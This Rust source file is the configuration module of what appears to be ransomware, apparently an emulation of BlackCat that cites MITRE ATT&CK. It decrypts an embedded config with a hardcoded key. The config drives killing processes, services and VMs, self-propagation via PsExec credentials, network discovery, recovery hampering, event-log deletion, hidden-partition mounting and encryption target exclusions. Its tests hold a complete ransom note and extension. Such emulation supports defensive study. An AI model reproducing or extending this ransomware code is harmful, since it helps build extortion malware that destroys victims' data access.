// config.rs - Host Configuration information and extraction

use std::collections::HashMap;
use std::error::Error;
use std::fmt;
use std::str;
use base64::{engine::general_purpose, Engine as _};
use encryptliterals::encrypt_cfg;
use serde_json;
use crate::proc::{killall_by_name};
use crate::service::terminate_services;
use encryptliterals::esl;

/// A representation of the Host we are running on
pub struct Host {
    config: Config,
    aes_key: [u8; 16]
}

impl Host {
    /// Create a new Host struct
    pub fn new(cfg: Config) -> Host {
        Host {
            config: cfg,
            aes_key: [0u8; 16]
        }
    }

    // Kill processes that could interfere with encryption
    pub fn kill_processes_for_encryption(&self) {
        #[cfg(target_os = "windows")]
        killall_by_name(&self.config.kill_processes);

        #[cfg(unix)] // Kill libvirt/virsh processes
        killall_by_name(&self.config.kill_processes_linux);
    }

    /// Stop services that could interfere with encryption
    pub fn kill_services_for_encryption(&self) {
        #[cfg(target_os = "windows")]
        terminate_services(&self.config.kill_services);

        #[cfg(unix)]
        terminate_services(&self.config.kill_services_linux);
    }
    
    pub fn get_excluded_directory_names(&self) -> &Vec<String>{
        return &self.config.exclude_directory_names;
    }

    pub fn get_excluded_file_names(&self) -> &Vec<String>{
        return &self.config.exclude_file_names;
    }

    pub fn get_excluded_file_extensions(&self) -> &Vec<String>{
        return &self.config.exclude_file_extensions;
    }

    pub fn get_extension(&self) -> &String{
        return &self.config.extension;
    }

    pub fn get_strict_include_paths(&self) -> &Vec<String>{
        return &self.config.strict_include_paths;
    }

    pub fn set_strict_include_paths(&mut self, paths: &mut Vec<String>){
        let _ = &self.config.strict_include_paths.clear();
        let _ = &self.config.strict_include_paths.append(paths);
    }

    pub fn append_exclude_directory_names(&mut self, paths: &mut Vec<String>){
        let _ = &self.config.exclude_directory_names.append(paths);
    }

    pub fn is_set_enable_wallpaper(&self) -> bool{
        return self.config.enable_set_wallpaper;
    }

    pub fn get_aes_key(&self) -> &[u8; 16]{
        return &self.aes_key;
    }

    pub fn set_aes_key(&mut self, key: [u8; 16]){
        self.aes_key = key;
    }

    pub fn get_note_file_name(&self) -> &String{
        return &self.config.note_file_name;
    }

    pub fn set_note_file_name(&mut self, name: String) {
        self.config.note_file_name = name;
    }

    pub fn get_note_full_text(&self) -> &String{
        return &self.config.note_full_text;
    }

    pub fn is_empty_recycling_bin(&self) -> bool{
        return self.config.empty_recycle_bin;
    }

    pub fn get_psexec_username(&self) -> &String {
        return &self.config.psexec_username;
    }

    pub fn get_psexec_password(&self) -> &String {
        return &self.config.psexec_password;
    }

    pub fn get_strict_include_targets(&self) -> &Vec<String>{
        return &self.config.strict_include_targets;
    }

    pub fn get_strict_include_scan_ranges(&self) -> &Vec<String>{
        return &self.config.strict_include_scan_ranges;
    }

    pub fn is_network_discovery_enabled(&self) -> bool {
        return self.config.enable_network_discovery;
    }

    pub fn is_propagation_enabled(&self) -> bool {
        return self.config.enable_self_propagation;
    }

    pub fn is_vm_kill_enabled(&self) -> bool {
        return self.config.enable_vm_kill;
    }

    pub fn is_vm_snapshot_kill_enabled(&self) -> bool {
        return self.config.enable_vm_snapshot_kill;
    }

    pub fn is_encryption_enabled(&self) -> bool {
        return self.config.enable_enc;
    }

    pub fn is_recovery_hampering_enabled(&self) -> bool {
        return self.config.enable_recovery_hampering;
    }

    pub fn is_event_del_enabled(&self) -> bool {
        return self.config.enable_event_del;
    }

    pub fn is_mount_hidden_partitions_enabled(&self) -> bool {
        return self.config.enable_hidden_partitions;
    }

    pub fn is_unmount_hidden_partitions_enabled(&self) -> bool {
        return self.config.unmount_hidden_partitions;
    }
}

impl fmt::Display for Host {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}", self.config)
    }
}

// JSON string representing encrypted host config information taken from JSON config files.
// Make sure to change psexec_username and psexec_password according to your environment
#[cfg(not(test))]
#[cfg(target_os = "windows")]
static JSON_CONFIG:&str = encrypt_cfg!("config\\config.json", "15742aa362a84ba3");

#[cfg(not(test))]
#[cfg(unix)]
static JSON_CONFIG:&str = encrypt_cfg!("config/config.json", "15742aa362a84ba3");

#[cfg(test)]
#[cfg(target_os = "windows")]
static JSON_CONFIG:&str = encrypt_cfg!("config\\unit_test_config.json", "15742aa362a84ba3");

#[cfg(test)]
#[cfg(unix)]
static JSON_CONFIG:&str = encrypt_cfg!("config/unit_test_config.json", "15742aa362a84ba3");

/// A struct to deserialize JSON config information into
#[derive(Default)]
#[cfg_attr(test, derive(serde::Serialize))]
pub struct Config {
    kill_processes: Vec<String>,
    kill_services: Vec<String>,
    kill_processes_linux: Vec<String>,
    kill_services_linux: Vec<String>,
    exclude_directory_names: Vec<String>,
    exclude_file_names: Vec<String>,
    exclude_file_extensions: Vec<String>,
    strict_include_paths: Vec<String>,
    enable_set_wallpaper: bool,
    enable_network_discovery: bool,
    enable_self_propagation: bool,
    enable_vm_kill: bool,
    enable_vm_snapshot_kill: bool,
    enable_enc: bool,
    enable_recovery_hampering: bool,
    enable_event_del: bool,
    enable_hidden_partitions: bool,
    unmount_hidden_partitions: bool,
    extension: String,
    note_file_name: String,
    note_full_text: String,
    empty_recycle_bin: bool,
    psexec_username: String,
    psexec_password: String,
    strict_include_targets: Vec<String>,
    strict_include_scan_ranges: Vec<String>
}

/**
 * validate_access_token
 *      About:
 *          Verify the provided access token to obtain the ransomware configuration.
 *      Result:
 *          Configuration struct or error on failure.
 *      MITRE ATT&CK Techniques:
 *          T1497: Virtualization/Sandbox Evasion
 *      CTI:
 *          https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf#page=8
 */
pub fn validate_access_token(access_token: &str) -> Result<Config, Box<dyn Error>> {
    if access_token.chars().count() < 16 {
        Err(String::from(esl!("Invalid access token format.")))?
    }
    parse_config(&JSON_CONFIG, access_token)
}

// Parse the JSON configuration information and store in a Config struct
// Avoid using serde serialization/deserialization to keep field names out of the binary.
fn parse_config(json_config: &str, decrypt_key: &str) -> Result<Config, Box<dyn Error>> {
    if decrypt_key.len() != 16 {
        Err(format!("{}: {}", esl!("Invalid key length provided"), decrypt_key.len()))?
    }
    let decoded = general_purpose::STANDARD.decode(json_config)?;
    let key_bytes = decrypt_key.as_bytes();
    let mut key = [0u8; 16];
    for i in 0..16 {
        key[i] = key_bytes[i];
    }
    let dec_cfg = str::from_utf8(&decoded)?;
    let config_map: HashMap<String, serde_json::Value> = match serde_json::from_str(dec_cfg) {
        Ok(o) => o,
        Err(e) => {
            Err(format!("{}: {}", esl!("Failed to parse JSON config (check your access token)"), e))?
        }
    };
    let parsed_config = Config {
        kill_processes: match config_map.get(esl!("kill_processes").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for kill_processes"), e))?
                },
            },
            None => Vec::new(),
        },
        kill_services: match config_map.get(esl!("kill_services").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for kill_services"), e))?
                },
            },
            None => Vec::new(),
        },
        kill_processes_linux: match config_map.get(esl!("kill_processes_linux").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for kill_processes_linux"), e))?
                },
            },
            None => Vec::new(),
        },
        kill_services_linux: match config_map.get(esl!("kill_services_linux").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for kill_services_linux"), e))?
                },
            },
            None => Vec::new(),
        },

        exclude_directory_names: match config_map.get(esl!("exclude_directory_names").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for exclude_directory_names"), e))?
                },
            },
            None => Vec::new(),
        },
        exclude_file_names: match config_map.get(esl!("exclude_file_names").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for exclude_file_names"), e))?
                },
            },
            None => Vec::new(),
        },
        exclude_file_extensions: match config_map.get(esl!("exclude_file_extensions").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for exclude_file_extensions"), e))?
                },
            },
            None => Vec::new(),
        },
        strict_include_paths: match config_map.get(esl!("strict_include_paths").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for strict_include_paths"), e))?
                },
            },
            None => Vec::new(),
        },
        enable_set_wallpaper: match config_map.get(esl!("enable_set_wallpaper").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for enable_set_wallpaper"), e))?
                },
            },
            None => false,
        },
        enable_network_discovery: match config_map.get(esl!("enable_network_discovery").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for enable_network_discovery"), e))?
                },
            },
            None => false,
        },
        enable_self_propagation: match config_map.get(esl!("enable_self_propagation").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for enable_self_propagation"), e))?
                },
            },
            None => false,
        },
        enable_vm_kill: match config_map.get(esl!("enable_vm_kill").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for enable_vm_kill"), e))?
                },
            },
            None => false,
        },
        enable_vm_snapshot_kill: match config_map.get(esl!("enable_vm_snapshot_kill").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for enable_vm_snapshot_kill"), e))?
                },
            },
            None => false,
        },
        enable_enc: match config_map.get(esl!("enable_enc").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for enable_enc"), e))?
                },
            },
            None => false,
        },
        enable_recovery_hampering: match config_map.get(esl!("enable_recovery_hampering").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for enable_recovery_hampering"), e))?
                },
            },
            None => false,
        },
        enable_event_del: match config_map.get(esl!("enable_event_del").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for enable_event_del"), e))?
                },
            },
            None => false,
        },
        enable_hidden_partitions: match config_map.get(esl!("enable_hidden_partitions").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for enable_hidden_partitions"), e))?
                },
            },
            None => false,
        },
        unmount_hidden_partitions: match config_map.get(esl!("unmount_hidden_partitions").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for unmount_hidden_partitions"), e))?
                },
            },
            None => false,
        },
        extension: match config_map.get(esl!("extension").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for extension"), e))?
                },
            },
            None => String::from(""),
        },
        note_file_name: match config_map.get(esl!("note_file_name").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for note_file_name"), e))?
                },
            },
            None => String::from(""),
        },
        note_full_text: match config_map.get(esl!("note_full_text").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for note_full_text"), e))?
                },
            },
            None => String::from(""),
        },
        empty_recycle_bin: match config_map.get(esl!("empty_recycle_bin").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for empty_recycle_bin"), e))?
                },
            },
            None => false,
        },
        psexec_username: match config_map.get(esl!("psexec_username").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for psexec_username"), e))?
                },
            },
            None => String::from(""),
        },
        psexec_password: match config_map.get(esl!("psexec_password").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for psexec_password"), e))?
                },
            },
            None => String::from(""),
        },
        strict_include_targets: match config_map.get(esl!("strict_include_targets").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for strict_include_targets"), e))?
                },
            },
            None => Vec::new(),
        },
        strict_include_scan_ranges: match config_map.get(esl!("strict_include_scan_ranges").as_str()) {
            Some(v) => match serde_json::from_value(v.clone()) {
                Ok(a) => a,
                Err(e) => {
                    Err(format!("{}: {}", esl!("Invalid config format for strict_include_scan_ranges"), e))?
                },
            },
            None => Vec::new(),
        },
    };
    Ok(parsed_config)
}

impl fmt::Display for Config {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(
            f, 
            "\n    {}: {:?}\n    {}: {:?}\n    {}: {:?}\n    {}: {:?}\n    {}: {:?}\n    {}: {:?}\n    {}: {:?}\n    {}: {:?}\n    {}: {}\n    {}: {}\n    {}: {}\n    {}: {}\n    {}: {}\n    {}: {}\n    {}: {}\n    {}: {}\n    {}: {}\n    {}: {}\n    {}: {}\n    {}: {}\n    {}: {}\n    {}: {}\n    {}: {}\n    {}: {}\n    {}: {:?}\n    {}: {:?}\n", 
            esl!("kill_processes"),
            self.kill_processes,
            esl!("kill_services"), 
            self.kill_services,
            esl!("kill_processes_linux"),
            self.kill_processes_linux,
            esl!("kill_services_linux"),
            self.kill_services_linux,
            esl!("exclude_directory_names"),
            self.exclude_directory_names,
            esl!("exclude_file_names"),
            self.exclude_file_names,
            esl!("exclude_file_extensions"),
            self.exclude_file_extensions,
            esl!("strict_include_paths"),
            self.strict_include_paths,
            esl!("enable_set_wallpaper"),
            self.enable_set_wallpaper,
            esl!("enable_network_discovery"),
            self.enable_network_discovery,
            esl!("enable_self_propagation"),
            self.enable_self_propagation,
            esl!("enable_vm_kill"),
            self.enable_vm_kill,
            esl!("enable_vm_snapshot_kill"),
            self.enable_vm_snapshot_kill,
            esl!("enable_enc"),
            self.enable_enc,
            esl!("enable_recovery_hampering"),
            self.enable_recovery_hampering,
            esl!("enable_event_del"),
            self.enable_event_del,
            esl!("enable_hidden_partitions"),
            self.enable_hidden_partitions,
            esl!("unmount_hidden_partitions"),
            self.unmount_hidden_partitions,
            esl!("extension"),
            self.extension,
            esl!("note_file_name"),
            self.note_file_name,
            esl!("note_full_text"),
            self.note_full_text,
            esl!("empty_recycle_bin"),
            self.empty_recycle_bin,
            esl!("psexec_username"),
            self.psexec_username,
            esl!("psexec_password"),
            self.psexec_password,
            esl!("strict_include_targets"),
            self.strict_include_targets,
            esl!("strict_include_scan_ranges"),
            self.strict_include_scan_ranges
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use regex::Regex;

    /// Test that JSON can be decrypted and parsed into the Config struct and yield the same string via Serialize
    #[test]
    fn test_json_config() {
        // create regex that hits on all whitespace characters
        let re = Regex::new(r"\s").unwrap();

        // Decrypt and ingest JSON config
        let c = parse_config(&JSON_CONFIG, "15742aa362a84ba3").unwrap();

        // Reserialize the JSON into a string
        let config = serde_json::to_string(&c).unwrap();

        // remove all whitespace
        let config_out = re.replace_all(&config, "");
        let want = re.replace_all(r#"
        {
            "kill_processes": ["firefox", "notepad", "msedge"],
            "kill_services": ["testsvc1", "testsvc2", "TestServ"],
            "kill_processes_linux": ["libvirtd", "virsh", "libvirt-dbus"],
            "kill_services_linux": ["libvirtd"],
            "exclude_directory_names": ["system volume information","intel","$windows.~ws","application data","$recycle.bin", "mozilla","program files (x86)","program files","$windows.~bt","public","msocache","windows","default","all users", "tor browser", "programdata","boot","config.msi","google","perflogs","appdata","windows.old","WindowsAzure"],
            "exclude_file_names": ["desktop.ini","autorun.inf","ntldr","bootsect.bak","thumbs.db","boot.ini","ntuser.dat", "iconcache.db","bootfont.bin","ntuser.ini","ntuser.dat.log"],
            "exclude_file_extensions": ["themepack","nls","diagpkg", "msi","lnk","exe","cab","scr","bat","drv","rtp","msp","prf","msc", "ico", "key","ocx","diagcab","diagcfg", "pdb","wpx","hlp","icns","rom","dll","msstyles","mod","ps1","ics","hta","bin","cmd","ani", "386","lock","cur","idx","sys","com","deskthemepack","shs","ldf","theme","mpa","nomedia", "spl","cpl","adv","icl","msu","xtlog"],
            "strict_include_paths": [],
            "enable_set_wallpaper": false,
            "enable_network_discovery": false,
            "enable_self_propagation": false,
            "enable_vm_kill": false,
            "enable_vm_snapshot_kill": false,
            "enable_enc": false,
            "enable_recovery_hampering": false,
            "enable_event_del": false,
            "enable_hidden_partitions": false,
            "unmount_hidden_partitions": false,
            "extension": ".skyfl2e",
            "note_file_name": "RECOVER-SKYFL2E-FILES.txt",
            "note_full_text": ">>Introduction\nImportant files on your machine were ENCRYPTED and now they have the \"SKYFL2E\" extension.\nIn order to recover your files, you need to follow the instructions below.\n\n>>CAUTION\nDO NOT MODIFY ENCRYPTED FILES YOURSELF.\nDO NOT USE THIRD PARTY SOFTWARE TO RESTORE YOUR DATA.\nYOU MAY DAMAGE YOUR FILES, RESULTING IN PERMANENT DATA LOSS.\nYOUR DATA IS STRONGLY ENCRYPTED, YOU CANNOT DECRYPT IT WITHOUT CIPHER KEY.\n\n>>What Should I do Next?\nFollow these simple steps to get everything back to normal:\n1) Download and install Tor browser from https://www.torproject.org/download/\n2) Navigate to: askfjejtqekjge0et1lkjasdq09gji13jgkdajv.testonion/?access-key=2646AEF615CD1126\n",
            "empty_recycle_bin": false,
            "psexec_username": "domain\\test_user",
            "psexec_password": "test_password",
            "strict_include_targets": ["10.20.20.102", "10.20.20.103"],
            "strict_include_scan_ranges": ["10.20.10.0/24", "10.20.20.0/24"]
        }"#, "");
        assert_eq!(config_out, want);
    }

    #[test]
    fn test_config_display() {
        // Decrypt and ingest JSON config
        let config = parse_config(&JSON_CONFIG, "15742aa362a84ba3").unwrap();

        let display_str = format!("{}", config);

        let want = r#"
    kill_processes: ["firefox", "notepad", "msedge"]
    kill_services: ["testsvc1", "testsvc2", "TestServ"]
    kill_processes_linux: ["libvirtd", "virsh", "libvirt-dbus"]
    kill_services_linux: ["libvirtd"]
    exclude_directory_names: ["system volume information", "intel", "$windows.~ws", "application data", "$recycle.bin", "mozilla", "program files (x86)", "program files", "$windows.~bt", "public", "msocache", "windows", "default", "all users", "tor browser", "programdata", "boot", "config.msi", "google", "perflogs", "appdata", "windows.old", "WindowsAzure"]
    exclude_file_names: ["desktop.ini", "autorun.inf", "ntldr", "bootsect.bak", "thumbs.db", "boot.ini", "ntuser.dat", "iconcache.db", "bootfont.bin", "ntuser.ini", "ntuser.dat.log"]
    exclude_file_extensions: ["themepack", "nls", "diagpkg", "msi", "lnk", "exe", "cab", "scr", "bat", "drv", "rtp", "msp", "prf", "msc", "ico", "key", "ocx", "diagcab", "diagcfg", "pdb", "wpx", "hlp", "icns", "rom", "dll", "msstyles", "mod", "ps1", "ics", "hta", "bin", "cmd", "ani", "386", "lock", "cur", "idx", "sys", "com", "deskthemepack", "shs", "ldf", "theme", "mpa", "nomedia", "spl", "cpl", "adv", "icl", "msu", "xtlog"]
    strict_include_paths: []
    enable_set_wallpaper: false
    enable_network_discovery: false
    enable_self_propagation: false
    enable_vm_kill: false
    enable_vm_snapshot_kill: false
    enable_enc: false
    enable_recovery_hampering: false
    enable_event_del: false
    enable_hidden_partitions: false
    unmount_hidden_partitions: false
    extension: .skyfl2e
    note_file_name: RECOVER-SKYFL2E-FILES.txt
    note_full_text: >>Introduction
Important files on your machine were ENCRYPTED and now they have the "SKYFL2E" extension.
In order to recover your files, you need to follow the instructions below.

>>CAUTION
DO NOT MODIFY ENCRYPTED FILES YOURSELF.
DO NOT USE THIRD PARTY SOFTWARE TO RESTORE YOUR DATA.
YOU MAY DAMAGE YOUR FILES, RESULTING IN PERMANENT DATA LOSS.
YOUR DATA IS STRONGLY ENCRYPTED, YOU CANNOT DECRYPT IT WITHOUT CIPHER KEY.

>>What Should I do Next?
Follow these simple steps to get everything back to normal:
1) Download and install Tor browser from https://www.torproject.org/download/
2) Navigate to: askfjejtqekjge0et1lkjasdq09gji13jgkdajv.testonion/?access-key=2646AEF615CD1126

    empty_recycle_bin: false
    psexec_username: domain\test_user
    psexec_password: test_password
    strict_include_targets: ["10.20.20.102", "10.20.20.103"]
    strict_include_scan_ranges: ["10.20.10.0/24", "10.20.20.0/24"]
"#;
        assert_eq!(display_str, want);
    }
}
